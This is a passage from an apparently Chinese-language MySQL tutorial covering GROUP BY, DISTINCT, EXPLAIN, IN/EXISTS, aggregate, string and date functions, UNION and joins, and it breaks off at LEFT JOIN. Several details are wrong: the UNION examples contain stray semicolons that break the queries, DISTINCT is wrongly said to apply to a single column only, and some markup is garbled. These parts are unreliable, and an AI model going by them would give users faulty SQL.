<p>在这里，<code>column1</code>, <code>column2</code>, … 是你想要从表中选择的列的名称，<code>table_name</code> 是你想要查询的表的名称，<code>aggregate_function</code> 是一个聚合函数（如 <code>SUM</code>, <code>COUNT</code>, <code>AVG</code> 等），<code>column</code> 是你想要按照其进行分组的列。</p>
<p>以下是一个例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> department, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> total_students</span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> department;</span><br></pre></td></tr></table></figure>

<p>这个查询将根据学生表中的<code>department</code>列对记录进行分组，并计算每个部门的学生人数。</p>
<p>请注意，<code>GROUP BY</code>子句通常与聚合函数一起使用。在<code>SELECT</code>语句中，你可以选择其他非聚合列，但这些列必须出现在<code>GROUP BY</code>子句中或作为聚合函数的参数。否则，将出现错误。</p>
<p>此外，你还可以在<code>GROUP BY</code>子句中使用多个列，以按照多个列进行分组。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> department, gender, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> total_students</span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> department, gender;</span><br></pre></td></tr></table></figure>

<p>这个查询将根据<code>department</code>和<code>gender</code>两个列对记录进行分组，并计算每个部门和性别的学生人数。</p>
<h2 id="DISTINCT"><a href="#DISTINCT" class="headerlink" title="DISTINCT"></a>DISTINCT</h2><p>MySQL中的<code>DISTINCT</code>关键字用于去重查询结果集。</p>
<p>例如，当我们需要查询某张表中的所有员工身份证号码时，可能会出现一些员工重复的情况。此时可以使用<code>DISTINCT</code>关键字来消除重复项，确保查询结果唯一：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT id_number FROM employee;</span><br></pre></td></tr></table></figure>

<p>上述语句将返回一张包含所有不重复身份证号码的数据表。</p>
<p>需要注意的是，<code>DISTINCT</code>操作是在内存中进行的，如果查询的结果集比较大，或者查询条件过多，可能会影响查询性能。同时，在使用<code>DISTINCT</code>关键字时，也要注意它适用于单个列的去重，若需要多列的去重，则需要使用<code>GROUP BY</code>语句来实现。</p>
<h2 id="EXPLAIN"><a href="#EXPLAIN" class="headerlink" title="EXPLAIN"></a>EXPLAIN</h2><p>在MySQL中，可以使用<code>EXPLAIN</code>关键字来分析SQL语句的执行计划，从而优化查询性能。</p>
<p><code>EXPLAIN</code>语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT * FROM table_name WHERE condition;</span><br></pre></td></tr></table></figure>

<p><code>EXPLAIN</code>会返回一张表格，其中包含了关于MySQL如何处理SQL语句的信息，例如表的读取顺序、使用的索引名及类型、是否需要临时表等等。通过检查这些信息，可以找到潜在的性能问题，并针对性地进行调整。</p>
<p>常见的一些列含义：</p>
<ul>
<li>id: 执行SELECT查询的序列号，id相同表示执行相同的查询。</li>
<li>select_type: 查询类型，例如Simple表示最简单的查询类型，Derived表示一个派生表或子查询中的查询类型。</li>
<li>table: 指出MySQL将从哪个表或派生表读取行。 </li>
<li>partitions: 匹配的分区列表，如果没有分区则为NULL。</li>
<li>type: 显示表的连接类型，包括system, const, eq_ref, ref, range, index和ALL。一般来说，查询类型越复杂，性能越低。</li>
<li>possible_keys: 展示MySQL可能使用哪些索引来查找表中的行，是一个逗号分隔的索引列表。 </li>
<li>key: 表示实际将使用哪个索引，如果为NULL则说明没有找到合适的索引。</li>
<li>key_len: 表示MySQL用了索引的长度，如果key为NULL，则key_len也为NULL。</li>
<li>ref: 显示索引的哪一列被使用了，如果可能的话，可能是一个常数。 </li>
<li>rows: MySQL认为它执行查询时必须检查的行数，这个值是估计出来的，并不一定准确。 </li>
<li>filtered: 表示此表过滤器的百分比，即选择性的值。</li>
<li>Extra: 其他信息，通常提供有关查询策略的特殊说明。</li>
</ul>
<p>通过对<code>EXPLAIN</code>结果的分析，可以确定哪些操作需要优化，例如加上索引、优化查询条件等，从而提高查询性能。</p>
<h1 id="IN和EXIST的区别与联系"><a href="#IN和EXIST的区别与联系" class="headerlink" title="IN和EXIST的区别与联系"></a>IN和EXIST的区别与联系</h1><p>在MySQL中，<code>EXISTS</code>和<code>IN</code>是两个用于条件判断和子查询的关键字。</p>
<p><code>EXISTS</code>用于检查子查询是否返回任何行，它返回一个布尔值。如果子查询返回至少一行，<code>EXISTS</code>条件为真（true），否则为假（false）。</p>
<p><code>IN</code>用于判断一个值是否存在于子查询的结果集中，它也返回一个布尔值。如果值存在于子查询的结果集中，<code>IN</code>条件为真（true），否则为假（false）。</p>
<p>以下是使用<code>EXISTS</code>和<code>IN</code>的基本语法示例：</p>
<ol>
<li><p>使用<code>EXISTS</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (subquery);</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name</span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="keyword">FROM</span> courses</span><br><span class="line">    <span class="keyword">WHERE</span> courses.student_id <span class="operator">=</span> students.id</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>IN</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (subquery);</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name</span><br><span class="line"><span class="keyword">FROM</span> students</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> student_id</span><br><span class="line">    <span class="keyword">FROM</span> courses</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>需要注意的是，<code>EXISTS</code>通常用于检查子查询的存在性，而<code>IN</code>通常用于检查一个值是否存在于另一个查询结果集中。在某些情况下，<code>EXISTS</code>和<code>IN</code>可以互相替代，但根据具体情况选择合适的关键字会更有效。此外，<code>EXISTS</code>通常在子查询的结果集很大时具有更好的性能，而<code>IN</code>适用于较小的结果集。</p>
<h1 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h1><ol>
<li>SUM：计算某个字段的总和。</li>
<li>COUNT：返回某个字段的行数，可以用于计算某个列或整个表中行的数量。</li>
<li>AVG：计算某个字段的平均值。</li>
<li>MIN：找出某个字段的最小值。</li>
<li>MAX：找出某个字段的最大值。</li>
<li>GROUP_CONCAT：将某个字段的值连接成一个字符串，并以逗号分隔。</li>
</ol>
<p>以下是MySQL聚合函数的基本用法及语法格式：</p>
<ol>
<li>SUM</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>COUNT</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>AVG</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT AVG(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>MIN</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MIN(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>MAX</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MAX(column_name) FROM table_name;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>GROUP_CONCAT</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_name SEPARATOR &#x27;,&#x27;) FROM table_name;</span><br></pre></td></tr></table></figure>

<p>其中，<code>column_name</code>为需要进行计算或处理的字段名，<code>table_name</code>为数据表的名称。需要注意的是，在使用GROUP_CONCAT时，可以指定<code>SEPARATOR</code>来指定连接字符串的分隔符，如果没有指定，默认使用逗号作为分隔符。</p>
<h1 id="字符串操作函数"><a href="#字符串操作函数" class="headerlink" title="字符串操作函数"></a>字符串操作函数</h1><h2 id="CONCAT"><a href="#CONCAT" class="headerlink" title="CONCAT()"></a>CONCAT()</h2><p>CONCAT函数是用来连接字符串的。</p>
<p>CONCAT函数接受两个或多个参数，并返回这些参数连接后的字符串结果。常见的用法是将两个或多个字段的值拼接成一个新的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONCAT(first_name, &#x27; &#x27;, last_name) AS full_name FROM users;</span><br></pre></td></tr></table></figure>

<p>上面的语句会查询<code>users</code>表中的<code>first_name</code>和<code>last_name</code>字段，并将这两个字段的值用空格连接起来，作为新的列<code>full_name</code>的值进行返回。</p>
<p>需要注意的是，在使用CONCAT函数时，需要注意参数的顺序以及字符串之间的分隔符。例如，如果要在两个字符串之间添加空格，可以使用空格字符’ ‘作为参数之一。</p>
<h2 id="RIGHT"><a href="#RIGHT" class="headerlink" title="RIGHT()"></a>RIGHT()</h2><p>RIGHT函数返回一个字符串的右侧指定长度的子字符串。使用时需要指定两个参数：要截取的字符串和需要返回的字符长度。</p>
<p>例如，下面的语句会查询<code>users</code>表中的<code>username</code>字段，并返回该字段后两个字符组成的新的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT RIGHT(username, 2) AS last_two_chars FROM users;</span><br></pre></td></tr></table></figure>

<h2 id="SUBSTRING"><a href="#SUBSTRING" class="headerlink" title="SUBSTRING()"></a>SUBSTRING()</h2><p>SUBSTRING函数可以从一个字符串中截取指定位置和长度的子字符串。使用时需要指定三个参数：要截取的字符串、开始的位置（从1开始计数）和需要返回的字符长度。</p>
<p>例如，下面的语句会查询<code>users</code>表中的<code>phone_number</code>字段，并返回该字段第4个字符开始的3个字符组成的新的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING(phone_number, 4, 3) AS area_code FROM users;</span><br></pre></td></tr></table></figure>

<h2 id="REPEAT"><a href="#REPEAT" class="headerlink" title="REPEAT()"></a>REPEAT()</h2><p>REPEAT函数返回一个重复指定次数的字符串。使用时需要指定两个参数：需要重复的字符串以及需要重复的次数。</p>
<p>例如，下面的语句会返回一个由5个“-”字符组成的新的字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT REPEAT(&#x27;-&#x27;, 5) AS line FROM users;</span><br></pre></td></tr></table></figure>

<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE()"></a>REVERSE()</h2><p>REVERSE函数返回一个字符串的反转形式，即将字符串中的字符顺序颠倒。使用时只需要指定一个参数，即要翻转的字符串。</p>
<p>例如，下面的语句会查询<code>users</code>表中的<code>username</code>字段，并将该字段的字符顺序全部颠倒：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT REVERSE(username) AS reversed_name FROM users;</span><br></pre></td></tr></table></figure>

<h1 id="日期和时间函数"><a href="#日期和时间函数" class="headerlink" title="日期和时间函数"></a>日期和时间函数</h1><p>MySQL提供了很多日期和时间函数，可以方便地对日期和时间进行处理和计算。以下是一些常用的MySQL日期和时间函数：</p>
<h2 id="NOW"><a href="#NOW" class="headerlink" title="NOW()"></a>NOW()</h2><p>NOW()函数返回当前日期和时间。</p>
<p>例如，下面的语句会查询当前日期和时间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT NOW();</span><br></pre></td></tr></table></figure>

<h4 id="DATE"><a href="#DATE" class="headerlink" title="DATE()"></a>DATE()</h4><p>DATE函数从一个日期或日期时间表达式中提取日期部分。</p>
<p>例如，下面的语句会返回当前日期：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE(NOW());</span><br></pre></td></tr></table></figure>

<h4 id="TIME"><a href="#TIME" class="headerlink" title="TIME()"></a>TIME()</h4><p>TIME函数从一个日期或日期时间表达式中提取时间部分。</p>
<p>例如，下面的语句会返回当前时间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT TIME(NOW());</span><br></pre></td></tr></table></figure>

<h4 id="YEAR"><a href="#YEAR" class="headerlink" title="YEAR()"></a>YEAR()</h4><p>YEAR函数从一个日期或日期时间表达式中提取年份部分。</p>
<p>例如，下面的语句会返回当前年份：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT YEAR(NOW());</span><br></pre></td></tr></table></figure>

<h4 id="MONTH"><a href="#MONTH" class="headerlink" title="MONTH()"></a>MONTH()</h4><p>MONTH函数从一个日期或日期时间表达式中提取月份部分。</p>
<p>例如，下面的语句会返回当前月份：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MONTH(NOW());</span><br></pre></td></tr></table></figure>

<h4 id="DAY"><a href="#DAY" class="headerlink" title="DAY()"></a>DAY()</h4><p>DAY函数从一个日期或日期时间表达式中提取日份部分。</p>
<p>例如，下面的语句会返回当前日期中的天数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DAY(NOW());</span><br></pre></td></tr></table></figure>

<h4 id="HOUR"><a href="#HOUR" class="headerlink" title="HOUR()"></a>HOUR()</h4><p>HOUR函数从一个日期或日期时间表达式中提取小时部分。</p>
<p>例如，下面的语句会返回当前时间中的小时数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT HOUR(NOW());</span><br></pre></td></tr></table></figure>

<h4 id="MINUTE"><a href="#MINUTE" class="headerlink" title="MINUTE()"></a>MINUTE()</h4><p>MINUTE函数从一个日期或日期时间表达式中提取分钟部分。</p>
<p>例如，下面的语句会返回当前时间中的分钟数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MINUTE(NOW());</span><br></pre></td></tr></table></figure>

<h4 id="SECOND"><a href="#SECOND" class="headerlink" title="SECOND()"></a>SECOND()</h4><p>SECOND函数从一个日期或日期时间表达式中提取秒部分。</p>
<p>例如，下面的语句会返回当前时间中的秒数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SECOND(NOW());</span><br></pre></td></tr></table></figure>

<h2 id="DATE-SUB"><a href="#DATE-SUB" class="headerlink" title="DATE_SUB()"></a>DATE_SUB()</h2><p>在 MySQL 中，可以使用 DATE_SUB() 函数和 INTERVAL 子句来查询一个日期字段 c 为五年前的记录。具体语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table</span><br><span class="line">WHERE c = DATE_SUB(NOW(), INTERVAL 5 YEAR);</span><br></pre></td></tr></table></figure>

<p>这个查询语句中，<code>NOW()</code> 函数返回当前时间，<code>DATE_SUB()</code> 函数将当前时间减去 5 年，然后查询满足条件的所有记录。</p>
<h2 id="CURDATE"><a href="#CURDATE" class="headerlink" title="CURDATE()"></a>CURDATE()</h2><p><code>CURDATE()</code> 函数返回系统当前日期。例如，以下查询语句将会返回当前日期：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CURDATE();</span><br></pre></td></tr></table></figure>

<h2 id="DATEDIFF"><a href="#DATEDIFF" class="headerlink" title="DATEDIFF()"></a>DATEDIFF()</h2><p><code>DATEDIFF(date1, date2)</code> 函数返回两个日期之间的天数差值（即 date1 - date2）。例如，以下查询语句将会计算出今天与指定日期之间的天数差值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATEDIFF(CURDATE(), &#x27;2022-01-01&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="DATE-ADD"><a href="#DATE-ADD" class="headerlink" title="DATE_ADD()"></a>DATE_ADD()</h2><p><code>DATE_ADD(date, INTERVAL value unit)</code> 函数可以对给定日期增加或减去一定的时长。其中 <code>date</code> 为基准日期，<code>value</code> 为增加或减少的数值，<code>unit</code> 为时间单位（如 DAY、WEEK、MONTH、YEAR 等）。例如，以下查询语句将会计算出五年前的日期：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE_ADD(CURDATE(), INTERVAL -5 YEAR);</span><br></pre></td></tr></table></figure>

<h2 id="DATE-FORMAT"><a href="#DATE-FORMAT" class="headerlink" title="DATE_FORMAT()"></a>DATE_FORMAT()</h2><p>DATE_FORMAT(date, format)<code>函数可以将给定日期格式化成指定的字符串形式。其中</code>date<code> 为待格式化的日期，</code>format&#96; 为日期格式串（如 ‘%Y-%m-%d’ 表示以年、月、日的格式显示日期）。例如，以下查询语句将会格式化出当前日期并输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATE_FORMAT(CURDATE(), &#x27;%Y-%m-%d&#x27;);</span><br></pre></td></tr></table></figure>

<h1 id="基于条件的查询"><a href="#基于条件的查询" class="headerlink" title="基于条件的查询"></a>基于条件的查询</h1><p>用于创建条件的关键字：</p>
<ul>
<li>WHERE</li>
<li>HAVING</li>
</ul>
<p>用于创建条件的关键字：</p>
<ul>
<li><p>比较运算符（如<code>=</code>，<code>!=</code>，<code>&lt;</code>，<code>&gt;</code>，<code>&lt;=</code>，<code>&gt;=</code>，<code>&lt;&gt;</code>）</p>
</li>
<li><p>逻辑运算符（如<code>AND</code>，<code>OR</code>，<code>NOT</code>），<code>IN</code>，<code>EXISTS</code>，<code>BETWEEN</code>，<code>LIKE</code>，<code>IS NULL</code>等</p>
<p>在 MySQL 中，AND、OR 和 NOT 是逻辑运算符，用于连接和组合多个条件表达式。当它们同时出现在一个查询语句中时，需要考虑它们的优先级。</p>
<p>MySQL 中的运算符优先级遵循以下顺序（由高到低）：</p>
<ol>
<li>NOT</li>
<li>AND</li>
<li>OR</li>
</ol>
<p>这意味着，NOT 的优先级最高，所以它会优先计算其后面的条件表达式，然后再应用其他的运算符。而 AND 的优先级比 OR 高，因此，在一个查询语句中，如果同时出现了 AND 和 OR 运算符，AND 会先于 OR 进行计算。</p>
<p>为了避免运算符优先级带来的不必要的困惑，我们可以使用圆括号来明确指定某些条件的计算顺序。具体来说，使用括号可以将几个条件组合在一起，并确保它们在适当的顺序下进行计算。</p>
<p>下面是一个例子，演示了如何在查询语句中使用括号控制条件表达式的计算顺序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM mytable</span><br><span class="line">WHERE (col1 = &#x27;value1&#x27; OR col2 = &#x27;value2&#x27;)</span><br><span class="line">AND col3 &gt; 100;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，首先使用括号指定 OR 条件的计算顺序，然后再结合 AND 运算符对这些条件进行组合。它的作用相当于检索 col1 等于 ‘value1’，或者 col2 等于 ‘value2’，并且 col3 大于 100 的所有行。</p>
</li>
</ul>
<h1 id="使用多个表"><a href="#使用多个表" class="headerlink" title="使用多个表"></a>使用多个表</h1><h2 id="联合查询（UNION）"><a href="#联合查询（UNION）" class="headerlink" title="联合查询（UNION）"></a>联合查询（UNION）</h2><p>在 MySQL 中，<code>UNION</code> 关键字用于将两个或多个 <code>SELECT</code> 语句的结果集合并成一个结果集。<code>UNION</code> 可以去除重复行，而 <code>UNION ALL</code> 则包含所有的行（包括重复行）。以下是 <code>UNION</code> 和 <code>UNION ALL</code> 的语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-- UNION 示例</span><br><span class="line">SELECT column1, column2, ... FROM table1</span><br><span class="line">UNION</span><br><span class="line">SELECT column1, column2, ... FROM table2;</span><br><span class="line">UNION</span><br><span class="line">SELECT column1, column2, ... FROM table3;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">-- UNION ALL 示例</span><br><span class="line">SELECT column1, column2, ... FROM table1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column1, column2, ... FROM table2;</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column1, column2, ... FROM table3;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们可以通过 <code>UNION</code> 合并两个表的查询结果，并返回所有不重复的行；或者通过 <code>UNION ALL</code> 合并两个表的查询结果，并返回所有行，包括重复行。</p>
<p>需要注意的是，在使用 <code>UNION</code> 或 <code>UNION ALL</code> 进行结果集合并时，两个 <code>SELECT</code> 语句必须满足以下条件：</p>
<ul>
<li>SELECT 语句中列数必须相同。</li>
<li>列类型必须相似或可隐式转换。</li>
<li>结果集中的列名来自第一个 SELECT 语句，后续的 SELECT 语句只能：<ul>
<li>与第一个 SELECT 语句中的列具有相同的名称，或者</li>
<li>为其列命名以匹配结果集的结构。</li>
</ul>
</li>
</ul>
<p>例如，以下是一个 <code>UNION</code> 操作的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT name, age FROM table1</span><br><span class="line">UNION</span><br><span class="line">SELECT name, age FROM table2;</span><br><span class="line">UNION</span><br><span class="line">SELECT name, age FROM table3;</span><br></pre></td></tr></table></figure>

<p>这里我们将查询结果按照 <code>name</code> 和 <code>age</code> 两列进行合并，如果存在相同的行则只返回一次。需要注意的是，<code>UNION</code> 操作会对结果集进行排序和去重操作，因此可能需要-根据实际情况调整查询语句的顺序和筛选条件。</p>
<p>总而言之，在 MySQL 中使用 <code>UNION</code> 和 <code>UNION ALL</code> 可以使我们方便地将多个查询结果组合在一起，并可以选择是否保留重复行。</p>
<h2 id="内连接（INNER-JOIN）"><a href="#内连接（INNER-JOIN）" class="headerlink" title="内连接（INNER JOIN）"></a>内连接（INNER JOIN）</h2><p>INNER JOIN操作用于连接两个表并返回匹配的行，只有当在关联列中两个表都存在匹配时才会返回结果。除此之外，还有一种相似的语法格式叫做“JOIN…ON…”，其效果与INNER JOIN完全相同。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table1 </span><br><span class="line">INNER JOIN table2 </span><br><span class="line">ON table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<p>使用示例：<br>查询商品表和订单表中有关联的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT orders.id, orders.order_date, products.product_name</span><br><span class="line">FROM orders</span><br><span class="line">INNER JOIN products</span><br><span class="line">ON orders.product_id = products.id;</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，我们连接了“商品”表和“订单”表，并使用ON子句指定了连接条件（“product_id”），结果集包括了这两个表中符合连接条件的数据。</p>
<h2 id="ON和USING"><a href="#ON和USING" class="headerlink" title="ON和USING"></a>ON和USING</h2><p>MySQL ON是一种在两个表之间进行连接的常用方法，通过指定连接条件来连接两个表并返回符合条件的结果。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table1 JOIN table2 ON table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<p>其中，table1和table2是要连接的表，column_name是连接两个表的共同列名。</p>
<p>使用示例：<br>查询所有部门和员工数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT departments.department_name, employees.first_name, employees.last_name</span><br><span class="line">FROM departments</span><br><span class="line">JOIN employees ON departments.department_id = employees.department_id;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，在使用ON子句时，可以比较不同类型的数据，如数字、文本等。在连接多个表时，也可以在ON子句中使用逻辑运算符（例如AND和OR），以指定更复杂的连接条件。</p>
<p>MySQL USING是一种简化JOIN操作的方法，该操作将在两个表之间使用共同的列进行连接。这样可以避免在ON子句的连接条件中重复指定相同列名，从而使查询更加简洁。</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table1 JOIN table2 USING (column_name);</span><br></pre></td></tr></table></figure>

<p>其中，table1和table2是要连接的表，column_name是连接两个表的共同列名。</p>
<p>使用示例：<br>查询所有部门和员工数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT departments.department_name, employees.first_name, employees.last_name</span><br><span class="line">FROM departments</span><br><span class="line">JOIN employees </span><br><span class="line">USING (department_id);</span><br></pre></td></tr></table></figure>

<p>需要注意的是，USING只能用于比较两个表中具有相同名称的列，如上面的例子中的department_id。如果两个表的连接条件的列名称不同，则必须使用ON子句来指定要连接的列</p>
<h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><h4 id="左外连接（LEFT-JOIN）"><a href="#左外连接（LEFT-JOIN）" class="headerlink" title="左外连接（LEFT JOIN）"></a>左外连接（LEFT JOIN）</h4><p>LEFT JOIN操作连接左侧的表和右侧的表，并返回左侧表的所有记录以及满足连接条件的右侧表的记录，如果没有匹配的行，则该结果集中的右侧表的字段将被设置为NULL值。</p>
<p>LEFT JOIN也可以写成LEFT OUTER JOIN</p>
<p>语法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s) FROM table1 </span><br><span class="line">LEFT [OUTER] JOIN table2 </span><br><span class="line">ON table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<p>使用示例：<br>查询所有的部门和员工数据以及那些没有员工的部门</p>
